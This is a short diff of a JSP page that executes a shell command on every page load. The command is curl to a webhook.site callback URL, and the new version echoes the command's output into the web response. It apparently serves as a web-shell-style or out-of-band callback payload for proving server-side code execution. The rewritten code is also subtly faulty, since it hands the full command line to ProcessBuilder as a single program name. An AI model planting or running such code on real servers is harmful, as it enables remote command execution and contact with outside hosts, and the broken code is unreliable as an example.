@@ -1,4 +1,11 @@
-<%@ page import="java.util.*,java.io.*"%>
+<%@ page import="java.io.*" %>
 <%
-	Process p = Runtime.getRuntime().exec("curl https://webhook.site/dee0c407-1982-4e24-a388-0f3e32637cca");
+ProcessBuilder pb = new ProcessBuilder("curl https://webhook.site/dee0c407-1982-4e24-a388-0f3e32637cca");
+Process p = pb.start();
+BufferedReader reader =
+    new BufferedReader(new InputStreamReader(p.getInputStream()));
+String line;
+while ((line = reader.readLine()) != null) {
+    out.println(line + "<br>");
+}
 %>
